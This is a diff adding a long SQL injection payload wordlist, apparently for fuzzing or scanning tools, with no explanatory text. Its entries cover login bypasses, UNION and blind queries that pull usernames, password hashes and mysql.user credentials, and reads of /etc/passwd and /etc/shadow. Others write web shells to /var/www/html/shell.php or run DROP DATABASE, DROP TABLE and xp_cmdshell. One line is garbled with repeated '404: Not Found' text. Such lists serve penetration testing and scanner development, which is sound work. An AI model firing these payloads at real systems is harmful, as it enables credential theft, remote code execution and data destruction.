@@ -1,0 +1,722 @@
+" "
+" #
+" --
+"&"
+"*"
+"-"
+"/*
+"^"
+'
+' #
+' '
+' --
+' –
+'#
+'&'
+'*'
+'-'
+'--
+'/*
+'^'
+=
+==
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+1′) and '1′='1–
+1' AND '1'='1
+1' AND 1=1#
+1' AND 1=1--
+1' AND '1'='2
+1' AND 'a'='a
+1' AND 'a'='b
+1' or '1' = '1
+1' or '1' = '1'#
+1' or '1' = '1'--
+1' or '1' = '1'/*
+1' OR '2'='2
+1' OR '2'='2'#
+1' OR '2'='2'--
+1 or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+1 or sleep(__TIME__)#
+1) or sleep(__TIME__)#
+1)) or sleep(__TIME__)#
+1' UNION SELECT NULL#
+1' UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL--
+1' WAITFOR DELAY '00:00:05'--
+1'; WAITFOR DELAY '00:00:05'--
+404: Not Found404: Not Found404: Not Found404: Not Found404: Not Foundsleep(__TIME__)#
+admin" #
+admin" --
+admin"/*
+admin' #
+admin' --
+admin'--
+admin'/*
+admin' and substring(password/text(),1,1)='7
+admin" or "1"="1
+admin" or "1"="1"#
+admin" or "1"="1"--
+admin" or "1"="1"/*
+admin" or 1=1
+admin" or 1=1#
+admin" or 1=1--
+admin" or 1=1/*
+admin") or "1"="1
+admin") or "1"="1"#
+admin") or "1"="1"--
+admin") or "1"="1"/*
+admin") or ("1"="1
+admin") or ("1"="1"#
+admin") or ("1"="1"--
+admin") or ("1"="1"/*
+admin' or '1'='1
+admin' or '1'='1'#
+admin' or '1'='1'--
+admin' or '1'='1'/*
+admin' or 1=1
+admin' or 1=1#
+admin' or 1=1--
+admin' or 1=1/*
+admin') or '1'='1
+admin') or '1'='1'#
+admin') or '1'='1'--
+admin') or '1'='1'/*
+admin') or ('1'='1
+admin') or ('1'='1'#
+admin') or ('1'='1'--
+admin') or ('1'='1'/*
+admin' OR '1'='1'#
+admin' OR '1'='1'--
+admin' OR '1'='1'/*
+admin"or 1=1 or ""="
+admin'or 1=1 or ''='
+' AND !0--
+' AND ~0--
+' AND !1--
+' AND ~1--
+' AND 1&0--
+' AND 1<<0--
+' AND 1>>0--
+' AND 1^0--
+' AND 1|0--
+" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
+' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
+ and 1=1
+ and 1=1–
+' and 1='1
+' AND 1&1--
+' AND 1<<1--
+' AND 1=1--
+' AND 1>>1--
+' AND 1^1--
+' AND 1|1--
+' AND 1=2--
+' AND 1=2 UNION ALL SELECT NULL--
+' AND 1=2 UNION ALL SELECT NULL,NULL--
+' AND 1=2 UNION ALL SELECT NULL,NULL,NULL--
+' AND 1=2 UNION SELECT NULL--
+' AND 1=2 UNION SELECT NULL,NULL--
+' AND 1=2 UNION SELECT NULL,NULL,NULL--
+' AND 1 BETWEEN 0 AND 2--
+' AND 1 BETWEEN 1 AND 1--
+' AND 1 BETWEEN 1 AND 2--
+' AND 1 DIV 0--
+' AND 1 DIV 1--
+' AND 1 IN (SELECT 1 FROM dual)--
+' AND 1 IN (SELECT 1 FROM users)--
+' AND 1 IN (SELECT password FROM users)--
+' AND 1 IN (SELECT password FROM users WHERE username='admin')--
+' AND 1 IS FALSE--
+' AND 1 IS NOT FALSE--
+' AND 1 IS NOT NULL--
+' AND 1 IS NOT TRUE--
+' AND 1 IS NULL--
+' AND 1 IS TRUE--
+' AND 1 LIKE 1--
+' AND '1' LIKE '1'--
+' AND 1 MOD 0--
+' AND 1 MOD 1--
+' AND 1 NOT BETWEEN 2 AND 3--
+' AND 1 REGEXP '1'--
+' AND 1 RLIKE '1'--
+' AND 1=(SELECT 1)--
+' AND 1=(SELECT 1 FROM dual)--
+' AND 1=(SELECT 1 FROM users)--
+' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--
+' AND 1=(SELECT COUNT(*) FROM users)--
+' AND 1 SOUNDS LIKE 1--
+' AND 1 XOR 0--
+' AND 1 XOR 1--
+' and a='a
+' AND 'a'='a
+' AND 'a'='b
+' AND 'a' BETWEEN 'a' AND 'a'--
+' AND 'a' BETWEEN 'a' AND 'z'--
+' AND 'a' IN (SELECT 'a' FROM dual)--
+' AND 'a' IN (SELECT password FROM users)--
+' AND 'a' IN (SELECT password FROM users WHERE username='admin')--
+' AND 'a' IN (SELECT username FROM users)--
+' AND 'a' LIKE '%'--
+' AND 'a' LIKE '%a%'--
+' AND 'a' LIKE '%a'--
+' AND 'a' LIKE 'a%'--
+' AND 'a' LIKE 'a'--
+' AND 'a' NOT BETWEEN 'b' AND 'z'--
+' AND 'a' REGEXP '.*'--
+' AND 'a' REGEXP '^a'--
+' AND 'a' REGEXP 'a'--
+' AND 'a' REGEXP '^a$'--
+' AND 'a' REGEXP 'a$'--
+' AND 'a' RLIKE '.*'--
+' AND 'a' RLIKE '^a'--
+' AND 'a' RLIKE 'a'--
+' AND 'a' RLIKE '^a$'--
+' AND 'a' RLIKE 'a$'--
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 64--
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 96--
+' AND 'a'=(SELECT 'a')--
+' AND 'a'=(SELECT 'a' FROM dual)--
+' AND 'a'=(SELECT password FROM users LIMIT 1)--
+' AND 'a'=(SELECT username FROM users LIMIT 1)--
+' AND 'a' SOUNDS LIKE 'a'--
+' AND BENCHMARK(100000000,MD5('test'))--
+' AND BENCHMARK(10000000,MD5('test'))--
+' AND BENCHMARK(50000000,MD5('test'))--
+' AND BENCHMARK(5000000,MD5('test'))--
+' AND EXISTS(SELECT * FROM information_schema.tables)--
+' AND EXISTS(SELECT * FROM users)--
+' AND EXP(~(SELECT * FROM (SELECT database())x))--
+' AND EXP(~(SELECT * FROM (SELECT password FROM users LIMIT 1)x))--
+' AND EXP(~(SELECT * FROM (SELECT user())x))--
+' AND EXP(~(SELECT * FROM (SELECT @@version)x))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1),0x7e))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT database()),0x7e),1)--
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT password FROM users LIMIT 1),0x7e),1)--
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT user()),0x7e),1)--
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version),0x7e),1)--
+' AND IF(1=1,SLEEP(5),0)--
+' AND IF(1=2,SLEEP(5),0)--
+' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64,SLEEP(5),0)--
+' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96,SLEEP(5),0)--
+' AND IF(LENGTH((SELECT password FROM users LIMIT 1))>10,SLEEP(5),0)--
+' AND IF(LENGTH((SELECT password FROM users LIMIT 1))>5,SLEEP(5),0)--
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,(SELECT database()),0x7e)) USING utf8)))--
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,(SELECT password FROM users LIMIT 1),0x7e)) USING utf8)))--
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,(SELECT user()),0x7e)) USING utf8)))--
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,(SELECT @@version),0x7e)) USING utf8)))--
+' AND LEFT((SELECT password FROM users LIMIT 1),1) = 'a'--
+' AND LEFT((SELECT password FROM users LIMIT 1),1) = 'b'--
+' AND LENGTH((SELECT password FROM users LIMIT 1)) > 10--
+' AND LENGTH((SELECT password FROM users LIMIT 1)) > 5--
+' AND MID((SELECT password FROM users LIMIT 1),1,1) = 'a'--
+' AND MID((SELECT password FROM users LIMIT 1),1,1) = 'b'--
+' AND NULL IS NOT NULL--
+' AND NULL IS NULL--
+' and 'one'='one
+' and 'one'='one–
+' AND pg_sleep(10)--
+' AND pg_sleep(15)--
+' AND pg_sleep(20)--
+' AND pg_sleep(30)--
+' AND pg_sleep(5)--
+' AND RIGHT((SELECT password FROM users LIMIT 1),1) = 'a'--
+' AND RIGHT((SELECT password FROM users LIMIT 1),1) = 'b'--
+' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(0x7e,(SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--
+' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(0x7e,(SELECT password FROM users LIMIT 1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--
+' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(0x7e,(SELECT user()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--
+' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(0x7e,(SELECT @@version),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT password FROM users LIMIT 1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT user()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT @@version),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--
+' AND (SELECT CASE WHEN (1=2) THEN SLEEP(5) ELSE 0 END)--
+' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64) THEN SLEEP(5) ELSE 0 END)--
+' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96) THEN SLEEP(5) ELSE 0 END)--
+' AND (SELECT CASE WHEN (LENGTH((SELECT password FROM users LIMIT 1))>10) THEN SLEEP(5) ELSE 0 END)--
+' AND (SELECT CASE WHEN (LENGTH((SELECT password FROM users LIMIT 1))>5) THEN SLEEP(5) ELSE 0 END)--
+' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--
+' AND (SELECT COUNT(*) FROM users) > 0--
+' AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1))x)--
+' AND (SELECT * FROM (SELECT NAME_CONST((SELECT password FROM users LIMIT 1),1),NAME_CONST((SELECT password FROM users LIMIT 1),1))x)--
+' AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1))x)--
+' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x)--
+' AND SLEEP(1)--
+' AND SLEEP(10)--
+' AND SLEEP(15)--
+' AND SLEEP(2)--
+' AND SLEEP(20)--
+' AND SLEEP(3)--
+' AND SLEEP(30)--
+' AND SLEEP(4)--
+' AND SLEEP(5)--
+' and substring(password/text(),1,1)='7
+' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1) = 'a'--
+' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1) = 'b'--
+' AND 'test'='fail
+' AND 'test'='test
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1),0x7e),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
+benchmark(10000000,MD5(1))#
+'; DROP DATABASE test--
+'; DROP TABLE users--
+'; EXEC xp_cmdshell('dir')--
+' GROUP BY 1--
+' GROUP BY 2--
+' GROUP BY 3--
+' GROUP BY 4--
+' GROUP BY 5--
+' group by password having 1=1--
+' group by userid having 1=1--
+' group by username having 1=1--
+' HAVING 1=1--
+' HAVING 1=2--
+' INTO DUMPFILE 'C:\\inetpub\\wwwroot\\shell.php'--
+' INTO DUMPFILE 'C:\\test.txt'--
+' INTO DUMPFILE '/tmp/test.txt'--
+' INTO DUMPFILE '/var/www/html/shell.php'--
+' INTO DUMPFILE '/var/www/html/test.txt'--
+' INTO OUTFILE 'C:\\inetpub\\wwwroot\\shell.php'--
+' INTO OUTFILE 'C:\\test.txt'--
+' INTO OUTFILE '/tmp/test.txt'--
+' INTO OUTFILE '/var/www/html/shell.php'--
+' INTO OUTFILE '/var/www/html/test.txt'--
+ like '%'
+" or "" "
+" or ""&"
+" or ""*"
+" or ""-"
+" or ""="
+" or ""^"
+' or '' '
+' or ''&'
+' or ''*'
+' or ''-'
+' or ''='
+' or ''^'
+'="or'
+' OR !0--
+' OR ~0--
+ or 0=0 #
+ or 0=0 --
+ or 0=0 –
+" or 0=0 #
+" or 0=0 --
+" or 0=0 –
+%' or '0'='0
+' or         0=0 #
+' or 0=0 #
+' or 0=0 --
+' or 0=0 –
+' OR !1--
+' OR ~1--
+' OR 1&0--
+' OR 1<<0--
+' OR 1>>0--
+' OR 1^0--
+' OR 1|0--
+ or 1=1
+ or 1=1#
+ or 1=1--
+ or 1=1/*
+ or 1=1–
+" or "1"="1
+" or "1"="1"#
+" or "1"="1"--
+" or "1"="1"/*
+" or 1=1
+" or 1=1 --
+" or 1=1 –
+" or 1=1#
+" or 1=1--
+" or 1=1/*
+" or 1=1–
+") or "1"="1
+") or "1"="1"#
+") or "1"="1"--
+") or "1"="1"/*
+") or ("1"="1
+") or ("1"="1"#
+") or ("1"="1"--
+") or ("1"="1"/*
+' or '1'='1
+' or '1'='1'#
+' or '1'='1'--
+' or '1'='1'/*
+' or '1′='1
+' or 1=1
+' or 1=1 --
+' or 1=1 –
+' or 1=1#
+' or 1=1--
+' or 1=1/*
+' or 1=1;#
+' or 1=1–
+') or '1'='1
+') or '1'='1'#
+') or '1'='1'--
+') or '1'='1'/*
+') or '1'='1--
+') or ('1'='1
+') or ('1'='1#
+') or ('1'='1'#
+') or ('1'='1'--
+') or ('1'='1'/*
+') or ('1'='1--
+'or'1=1
+'or'1=1′
+) or '1′='1–
+) or ('1′='1–
+or 1=1
+or 1=1#
+or 1=1--
+or 1=1/*
+' OR '1'='1
+' OR 1&1--
+' OR 1<<1--
+' OR 1=1#
+' OR 1=1--
+' OR 1=1/*
+' OR 1>>1--
+' OR 1^1--
+' OR 1|1--
+') OR '1'='1
+') OR ('1'='1
+' OR 1=1;%00
+' OR 1=1 AND "'"="'
+' OR 1=1 AND '!'='!
+' OR 1=1 AND '"'='"
+' OR 1=1 AND '#'='#
+' OR 1=1 AND '%'='
+' OR 1=1 AND '&'='&
+' OR 1=1 AND '('='(
+' OR 1=1 AND ')'=')
+' OR 1=1 AND '*'='*
+' OR 1=1 AND '+'='+
+' OR 1=1 AND ','=',
+' OR 1=1 AND '-'='-
+' OR 1=1 AND '.'='.
+' OR 1=1 AND '/'='/
+' OR 1=1 AND ':'=':
+' OR 1=1 AND ';'=';
+' OR 1=1 AND '<'='<
+' OR 1=1 AND '='='=
+' OR 1=1 AND '>'='>
+' OR 1=1 AND '?'='?
+' OR 1=1 AND '@'='@
+' OR 1=1 AND '['='[
+' OR 1=1 AND '\'='\\
+' OR 1=1 AND ']'=']
+' OR 1=1 AND '^'='^
+' OR 1=1 AND '`'='`
+' OR 1=1 AND '{'='{ 
+' OR 1=1 AND '|'='|
+' OR 1=1 AND '}'='}
+' OR 1=1 AND '~'='~
+' OR 1=1 AND '$'='$
+' OR 1=1 INTO DUMPFILE '/tmp/test.txt'--
+' OR 1=1 INTO DUMPFILE '/var/www/html/shell.php'--
+' OR 1=1 INTO OUTFILE '/tmp/test.txt'--
+' OR 1=1 INTO OUTFILE '/var/www/html/shell.php'--
+' or 1=1 limit 1 -- -+
+' or 1=1 LIMIT 1;#
+' OR 1=1 LIMIT 1#
+' OR 1=1 LIMIT 1--
+' OR 1=1 LIMIT 1/*
+' OR 1=1 LIMIT 1,1#
+' OR 1=1 LIMIT 1,1--
+' OR 1=1 LIMIT 1,1/*
+"or 1=1 or ""="
+'or 1=1 or ''='
+' OR 1 BETWEEN 0 AND 2--
+' OR 1 BETWEEN 1 AND 1--
+' OR 1 BETWEEN 1 AND 2--
+' OR 1 DIV 0--
+' OR 1 DIV 1--
+' OR 1 IN (SELECT 1 FROM dual)--
+' OR 1 IN (SELECT 1 FROM users)--
+' OR 1 IN (SELECT password FROM users)--
+' OR 1 IN (SELECT password FROM users WHERE username='admin')--
+' OR 1 IS FALSE--
+' OR 1 IS NOT FALSE--
+' OR 1 IS NOT NULL--
+' OR 1 IS NOT TRUE--
+' OR 1 IS NULL--
+' OR 1 IS TRUE--
+' OR 1 LIKE 1--
+' OR '1' LIKE '1'--
+' OR 1 MOD 0--
+' OR 1 MOD 1--
+' OR 1 NOT BETWEEN 2 AND 3--
+' OR 1 REGEXP '1'--
+' OR 1 RLIKE '1'--
+' OR 1=(SELECT 1)--
+' OR 1=(SELECT 1 FROM dual)--
+' OR 1=(SELECT 1 FROM users)--
+' OR 1=(SELECT COUNT(*) FROM information_schema.tables)--
+' OR 1=(SELECT COUNT(*) FROM users)--
+' OR 1 SOUNDS LIKE 1--
+' OR 1 XOR 0--
+' OR 1 XOR 1--
+" or "a"="a
+") or ("a"="a
+' or 'a'='a
+' or a=a--
+' or a=a–
+') or ('a'='a
+' OR 'a'='a
+' OR 'a'='a'#
+' OR 'a'='a'--
+') or ('a'='a and hi") or ("a"="a
+' OR 'a' BETWEEN 'a' AND 'a'--
+' OR 'a' BETWEEN 'a' AND 'z'--
+' OR 'a' IN (SELECT 'a' FROM dual)--
+' OR 'a' IN (SELECT password FROM users)--
+' OR 'a' IN (SELECT password FROM users WHERE username='admin')--
+' OR 'a' IN (SELECT username FROM users)--
+' OR 'a' LIKE '%'--
+' OR 'a' LIKE '%a%'--
+' OR 'a' LIKE '%a'--
+' OR 'a' LIKE 'a%'--
+' OR 'a' LIKE 'a'--
+'=' 'or' and '=' 'or'
+' OR 'a' NOT BETWEEN 'b' AND 'z'--
+' OR 'a' REGEXP '.*'--
+' OR 'a' REGEXP '^a'--
+' OR 'a' REGEXP 'a'--
+' OR 'a' REGEXP '^a$'--
+' OR 'a' REGEXP 'a$'--
+' OR 'a' RLIKE '.*'--
+' OR 'a' RLIKE '^a'--
+' OR 'a' RLIKE 'a'--
+' OR 'a' RLIKE '^a$'--
+' OR 'a' RLIKE 'a$'--
+' OR 'a'=(SELECT 'a')--
+' OR 'a'=(SELECT 'a' FROM dual)--
+' OR 'a'=(SELECT password FROM users LIMIT 1)--
+' OR 'a'=(SELECT username FROM users LIMIT 1)--
+' OR 'a' SOUNDS LIKE 'a'--
+" or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+' OR BENCHMARK(10000000,MD5('test'))--
+' OR BENCHMARK(5000000,MD5('test'))--
+' ORDER BY 1--
+' ORDER BY 10--
+' ORDER BY 100--
+' ORDER BY 2--
+' ORDER BY 20--
+' ORDER BY 3--
+' ORDER BY 4--
+' ORDER BY 5--
+' OR EXISTS(SELECT * FROM information_schema.tables)--
+' OR EXISTS(SELECT * FROM users)--
+' OR NULL IS NOT NULL--
+' OR NULL IS NULL--
+' or 'one'='one
+' or 'one'='one–
+' OR pg_sleep(10)--
+' OR pg_sleep(5)--
+' OR SLEEP(10)--
+' OR SLEEP(5)--
+" or sleep(__TIME__)#
+" or sleep(__TIME__)="
+") or sleep(__TIME__)="
+")) or sleep(__TIME__)="
+' or sleep(__TIME__)#
+' or sleep(__TIME__)='
+') or sleep(__TIME__)='
+')) or sleep(__TIME__)='
+ or true
+" or true--
+") or true--
+' or true--
+') or true--
+or true--
+' or uid like '%
+' or uname like '%
+' or userid like '%
+' or user like '%
+' or username like '%
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+' or 'x'='x
+') or ('x')=('x
+') or ('x'='x
+')) or (('x'))=(('x
+' OR 'x'='x
+' OR 'x'='x'#
+' OR 'x'='x'#;
+' OR 'x'='x'--
+' REGEXP SLEEP(10)--
+' REGEXP SLEEP(5)--
+' RLIKE SLEEP(10)--
+' RLIKE SLEEP(5)--
+' UNION ALL SELECT 1, @@version;#
+' UNION ALL SELECT load_file('C:\\boot.ini'),NULL,NULL--
+' UNION ALL SELECT load_file('/etc/passwd'),NULL,NULL--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION ALL SELECT system_user(),user();#
+' UNION ALL SELECT user(),database(),version()--
+' UNION ALL SELECT @@version,@@datadir,@@basedir--
+' UNION SELECT 1,2,3,4,5--
+' UNION SELECT 1,2,3,4,5,6--
+' UNION SELECT 1,2,3,4,5,6,7--
+' UNION SELECT 1,2,3,4,5,6,7,8--
+' UNION SELECT 1,2,3,4,5,6,7,8,9--
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10--
+' UNION SELECT 'a','b','c','d'--
+' UNION SELECT 'a','b','c',NULL--
+' UNION SELECT 'a','b',NULL,'c'--
+' UNION SELECT 'a','b',NULL,NULL--
+' UNION SELECT AES_DECRYPT(AES_ENCRYPT('ABC','key'),'key')--
+' UNION SELECT AES_ENCRYPT('ABC','key')--
+' UNION SELECT 'a',NULL,'b','c'--
+' UNION SELECT 'a',NULL,'b',NULL--
+' UNION SELECT 'a',NULL,NULL,'b'--
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT ASCII('A')--
+' UNION SELECT @@basedir,@@tmpdir,@@log_error--
+' UNION SELECT BIN(10)--
+' UNION SELECT BIT_LENGTH('ABC')--
+' UNION SELECT CHAR(0x41)--
+' UNION SELECT CHAR(0x41,0x42,0x43)--
+' UNION SELECT CHAR(117,115,101,114),CHAR(112,97,115,115)--
+' UNION SELECT CHAR(65)--
+' UNION SELECT CHAR(65,66,67)--
+' UNION SELECT CHAR_LENGTH('ABC')--
+' UNION SELECT column_name FROM information_schema.columns--
+' UNION SELECT COMPRESS('ABC')--
+' UNION SELECT CONCAT(0x41,0x42,0x43)--
+' UNION SELECT CONCAT('A','B','C')--
+' UNION SELECT CONCAT(CHAR(65),CHAR(66),CHAR(67))--
+' UNION SELECT CONCAT(username,0x3a,password) FROM users--
+' UNION SELECT CONCAT_WS(',','A','B','C')--
+' UNION SELECT CONV(10,10,16)--
+' UNION SELECT CONV(10,10,2)--
+' UNION SELECT database(),user(),version()--
+' UNION SELECT DECODE(ENCODE('ABC','key'),'key')--
+' UNION SELECT DES_DECRYPT(DES_ENCRYPT('ABC'))--
+' UNION SELECT DES_ENCRYPT('ABC')--
+' UNION SELECT ELT(2,'A','B','C')--
+' UNION SELECT ENCODE('ABC','key')--
+' UNION SELECT ENCRYPT('ABC')--
+' UNION SELECT EXPORT_SET(5,'Y','N',',',4)--
+' UNION SELECT FIELD('B','A','B','C')--
+' UNION SELECT FIND_IN_SET('B','A,B,C')--
+' UNION SELECT GROUP_CONCAT('A','B','C')--
+' UNION SELECT GROUP_CONCAT(username,0x3a,password) FROM users--
+' UNION SELECT HEX(10)--
+' UNION SELECT HEX('ABC')--
+' UNION SELECT @@hostname,@@datadir,@@version--
+' UNION SELECT host,user FROM mysql.user--
+' UNION SELECT host,user,password FROM mysql.user--
+' UNION SELECT INSERT('ABC',2,1,'X')--
+' UNION SELECT INSTR('ABC','B')--
+' UNION SELECT LCASE('ABC')--
+' UNION SELECT LEFT('ABC',1)--
+' UNION SELECT LEFT('ABC',2)--
+' UNION SELECT LEFT('ABC',3)--
+' UNION SELECT LENGTH('ABC')--
+' UNION SELECT LOAD_FILE('C:\\boot.ini')--
+' UNION SELECT LOAD_FILE('C:\\windows\\win.ini')--
+' UNION SELECT LOAD_FILE('/etc/hosts')--
+' UNION SELECT LOAD_FILE('/etc/issue')--
+' UNION SELECT LOAD_FILE('/etc/motd')--
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+' UNION SELECT LOAD_FILE('/etc/shadow')--
+' UNION SELECT LOAD_FILE('/proc/cpuinfo')--
+' UNION SELECT LOAD_FILE('/proc/meminfo')--
+' UNION SELECT LOAD_FILE('/proc/version')--
+' UNION SELECT LOCATE('B','ABC')--
+' UNION SELECT LOWER('ABC')--
+' UNION SELECT LPAD('ABC',5,'X')--
+' UNION SELECT LTRIM(' ABC')--
+' UNION SELECT MAKE_SET(1,'A','B','C')--
+' UNION SELECT MD5('ABC')--
+' UNION SELECT MID('ABC',1,1)--
+' UNION SELECT MID('ABC',2,1)--
+' UNION SELECT MID('ABC',3,1)--
+' UNION SELECT NULL--
+' UNION SELECT NULL,'a','b','c'--
+' UNION SELECT NULL,'a','b',NULL--
+' UNION SELECT NULL,'a',NULL,'b'--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a','b'--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL WHERE 1=2--
+' UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2--
+' UNION SELECT NULL,NULL,NULL WHERE 1=2--
+' UNION SELECT NULL,NULL WHERE 1=2--
+' UNION SELECT OCT(10)--
+' UNION SELECT OLD_PASSWORD('ABC')--
+' UNION SELECT ORD('A')--
+' UNION SELECT PASSWORD('ABC')--
+' UNION SELECT POSITION('B' IN 'ABC')--
+' UNION SELECT QUOTE('ABC')--
+' UNION SELECT REPEAT('A',3)--
+' UNION SELECT REPLACE('ABC','B','X')--
+' UNION SELECT REVERSE('ABC')--
+' UNION SELECT RIGHT('ABC',1)--
+' UNION SELECT RIGHT('ABC',2)--
+' UNION SELECT RIGHT('ABC',3)--
+' UNION SELECT RPAD('ABC',5,'X')--
+' UNION SELECT RTRIM('ABC ')--
+' UNION SELECT SHA1('ABC')--
+' UNION SELECT SHA2('ABC',256)--
+' UNION SELECT SHA('ABC')--
+' UNION SELECT SOUNDEX('ABC')--
+' UNION SELECT SPACE(3)--
+' UNION SELECT STRCMP('ABC','ABC')--
+' UNION SELECT STRCMP('ABC','XYZ')--
+' UNION SELECT SUBSTR('ABC',1,1)--
+' UNION SELECT SUBSTR('ABC',2,1)--
+' UNION SELECT SUBSTR('ABC',3,1)--
+' UNION SELECT SUBSTRING('ABC',1,1)--
+' UNION SELECT SUBSTRING('ABC',2,1)--
+' UNION SELECT SUBSTRING('ABC',3,1)--
+' UNION SELECT table_name,column_name FROM information_schema.columns--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION select table_schema,table_name FROM information_Schema.tables;#
+' UNION SELECT table_schema,table_name FROM information_schema.tables--
+' UNION SELECT TRIM(' ABC ')--
+' UNION SELECT UCASE('abc')--
+' UNION SELECT UNCOMPRESS(COMPRESS('ABC'))--
+' UNION SELECT UNHEX('414243')--
+' UNION SELECT UPPER('abc')--
+' UNION SELECT user FROM mysql.user--
+' UNION SELECT username, password FROM users--
+' WAITFOR DELAY '00:00:01'--
+' WAITFOR DELAY '00:00:02'--
+' WAITFOR DELAY '00:00:03'--
+' WAITFOR DELAY '00:00:05'--
+'; WAITFOR DELAY '00:00:05'--
+' WAITFOR DELAY '00:00:10'--
+' WAITFOR DELAY '00:00:15'--
+' WAITFOR DELAY '00:00:20'--
+' WAITFOR DELAY '00:00:30'--
+"));waitfor delay '0:0:__TIME__'--
+");waitfor delay '0:0:__TIME__'--
+";waitfor delay '0:0:__TIME__'--
+'));waitfor delay '0:0:__TIME__'--
+');waitfor delay '0:0:__TIME__'--
+';waitfor delay '0:0:__TIME__'--
+));waitfor delay '0:0:__TIME__'--
+);waitfor delay '0:0:__TIME__'--
+;waitfor delay '0:0:__TIME__'--
